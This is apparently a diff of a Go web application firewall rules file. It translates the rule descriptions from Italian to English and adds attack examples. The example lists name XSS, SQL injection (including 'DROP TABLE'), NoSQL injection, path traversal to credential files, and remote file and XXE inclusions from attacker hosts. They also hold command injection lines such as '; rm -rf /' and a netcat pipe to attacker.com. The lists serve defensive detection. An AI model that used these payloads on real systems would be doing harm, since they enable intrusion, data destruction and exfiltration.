@@ -12,7 +12,8 @@ type DefaultRule struct {
 	Enabled     bool   `json:"enabled"`
 }
 
-// GetDefaultRules ritorna tutte le regole di default implementate nel WAF
+// GetDefaultRules returns all default rules implemented in the WAF
+// These rules BLOCK attacks, they don't just detect them
 func GetDefaultRules() []DefaultRule {
 	return []DefaultRule{
 		{
@@ -22,12 +23,14 @@ func GetDefaultRules() []DefaultRule {
 			Severity:  "HIGH",
 			IsDefault: true,
 			Enabled:   true,
-			Description: "Rileva tentativi di Cross-Site Scripting (XSS). Include pattern per script tag, event handler, funzioni JS pericolose e encoding.",
+			Description: "Blocks Cross-Site Scripting (XSS) attempts. Monitors script tags, event handlers, dangerous JS functions and encoding.",
 			Examples: []string{
 				"<script>alert('xss')</script>",
 				"<img src=x onerror=alert(1)>",
 				"javascript:alert('xss')",
 				"<body onload=alert('xss')>",
+				"eval(atob('...'))",
+				"setTimeout(alert)",
 			},
 		},
 		{
@@ -37,13 +40,16 @@ func GetDefaultRules() []DefaultRule {
 			Severity:  "CRITICAL",
 			IsDefault: true,
 			Enabled:   true,
-			Description: "Rileva tentativi di SQL Injection. Include pattern per UNION-based, boolean-based, time-based blind, stacked queries e information schema.",
+			Description: "Blocks SQL Injection attempts. Includes patterns for UNION-based, boolean-based, time-based blind and stacked queries.",
 			Examples: []string{
 				"' OR '1'='1",
+				"' OR 1=1 --",
 				"admin' --",
 				"UNION SELECT * FROM users",
 				"'; DROP TABLE users; --",
 				"SLEEP(5)",
+				"BENCHMARK(1000,MD5('A'))",
+				"' UNION ALL SELECT NULL,NULL FROM information_schema.tables",
 			},
 		},
 		{
@@ -53,11 +59,14 @@ func GetDefaultRules() []DefaultRule {
 			Severity:  "CRITICAL",
 			IsDefault: true,
 			Enabled:   true,
-			Description: "Rileva tentativi di NoSQL Injection. Monitora pattern per MongoDB, CouchDB e altri database NoSQL.",
+			Description: "Blocks NoSQL Injection attempts. Monitors MongoDB operators and query injection.",
 			Examples: []string{
-				"{\"$ne\": \"\"}",
+				"{\"$ne\": null}",
 				"{\"$gt\": \"\"}",
-				"db.users.find({$where: \"this.password==\\\"123\\\"\"})",
+				"[$ne]=",
+				"[$gt]=",
+				"db.users.find({$where:\"this.password=='123'\"})",
+				"{\"$regex\": \".*\"}",
 			},
 		},
 		{
@@ -67,12 +76,13 @@ func GetDefaultRules() []DefaultRule {
 			Severity:  "HIGH",
 			IsDefault: true,
 			Enabled:   true,
-			Description: "Rileva tentativi di Local File Inclusion. Monitora path traversal e inclusioni di file locali.",
+			Description: "Blocks Local File Inclusion attempts. Monitors path traversal and local file inclusions.",
 			Examples: []string{
 				"../../../etc/passwd",
-				"....//....//....//etc/passwd",
+				"....//....//etc/passwd",
 				"php://filter/convert.base64-encode/resource=index.php",
 				"/etc/passwd%00.txt",
+				"..\\..\\..\\windows\\system32\\config\\sam",
 			},
 		},
 		{
@@ -82,10 +92,10 @@ func GetDefaultRules() []DefaultRule {
 			Severity:  "HIGH",
 			IsDefault: true,
 			Enabled:   true,
-			Description: "Rileva tentativi di path traversal per accedere a directory non autorizzate.",
+			Description: "Blocks path traversal attempts to access unauthorized directories.",
 			Examples: []string{
 				"../../../etc/passwd",
-				"..\\..\\..\\windows\\system32\\config\\sam",
+				"..\\..\\..\\windows\\system32",
 				"%2e%2e%2f%2e%2e%2fetc%2fpasswd",
 			},
 		},
@@ -96,7 +106,7 @@ func GetDefaultRules() []DefaultRule {
 			Severity:  "CRITICAL",
 			IsDefault: true,
 			Enabled:   true,
-			Description: "Rileva tentativi di Remote File Inclusion. Monitora inclusioni di file remoti.",
+			Description: "Blocks Remote File Inclusion attempts. Prevents inclusion of remote files.",
 			Examples: []string{
 				"?file=http://evil.com/shell.php",
 				"?page=ftp://attacker.com/malware.txt",
@@ -110,13 +120,15 @@ func GetDefaultRules() []DefaultRule {
 			Severity:  "CRITICAL",
 			IsDefault: true,
 			Enabled:   true,
-			Description: "Rileva tentativi di Command Injection. Monitora esecuzione di comandi sistema attraverso input.",
+			Description: "Blocks Command Injection attempts. Prevents system command execution.",
 			Examples: []string{
 				"; ls -la",
 				"| cat /etc/passwd",
 				"& whoami",
 				"`ping 127.0.0.1`",
 				"$(whoami)",
+				"; rm -rf /",
+				"| nc attacker.com 1234",
 			},
 		},
 		{
@@ -126,9 +138,9 @@ func GetDefaultRules() []DefaultRule {
 			Severity:  "CRITICAL",
 			IsDefault: true,
 			Enabled:   true,
-			Description: "Rileva tentativi di XXE attacks attraverso processamento di XML malformato.",
+			Description: "Blocks XXE attacks. Prevents access to local files via XML.",
 			Examples: []string{
-				"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+				"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
 				"<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">",
 			},
 		},
@@ -139,7 +151,7 @@ func GetDefaultRules() []DefaultRule {
 			Severity:  "CRITICAL",
 			IsDefault: true,
 			Enabled:   true,
-			Description: "Rileva tentativi di SSRF per accedere a risorse interne del server.",
+			Description: "Blocks SSRF attempts. Prevents access to internal server resources.",
 			Examples: []string{
 				"http://localhost:8080/admin",
 				"http://127.0.0.1:3306",
@@ -154,7 +166,7 @@ func GetDefaultRules() []DefaultRule {
 			Severity:  "HIGH",
 			IsDefault: true,
 			Enabled:   true,
-			Description: "Rileva tentativi di LDAP Injection per manipolare query LDAP.",
+			Description: "Blocks LDAP Injection attempts. Protects against manipulated LDAP queries.",
 			Examples: []string{
 				"*)(uid=*",
 				"admin*",
@@ -168,7 +180,7 @@ func GetDefaultRules() []DefaultRule {
 			Severity:  "CRITICAL",
 			IsDefault: true,
 			Enabled:   true,
-			Description: "Rileva tentativi di SSTI su template engine (Jinja2, ERB, Thymeleaf, ecc.).",
+			Description: "Blocks SSTI attempts. Protects Jinja2, ERB, Thymeleaf and other template engines.",
 			Examples: []string{
 				"{{ 7 * 7 }}",
 				"<%= 7 * 7 %>",
@@ -184,10 +196,10 @@ func GetDefaultRules() []DefaultRule {
 			Severity:  "HIGH",
 			IsDefault: true,
 			Enabled:   true,
-			Description: "Rileva tentativi di Response Splitting attraverso header injection.",
+			Description: "Blocks Response Splitting attempts. Prevents header injection.",
 			Examples: []string{
-				"HTTP/1.1 200 OK\r\n\r\n",
-				"\r\nSet-Cookie: admin=true",
+				"HTTP/1.1 200 OK\\r\\n\\r\\n",
+				"\\r\\nSet-Cookie: admin=true",
 				"%0d%0aSet-Cookie:%20admin=1",
 			},
 		},
@@ -198,7 +210,7 @@ func GetDefaultRules() []DefaultRule {
 			Severity:  "HIGH",
 			IsDefault: true,
 			Enabled:   true,
-			Description: "Rileva tentativi di Prototype Pollution su applicazioni JavaScript.",
+			Description: "Blocks Prototype Pollution attempts. Protects JavaScript applications.",
 			Examples: []string{
 				"?__proto__[isAdmin]=true",
 				"?constructor[prototype][isAdmin]=true",
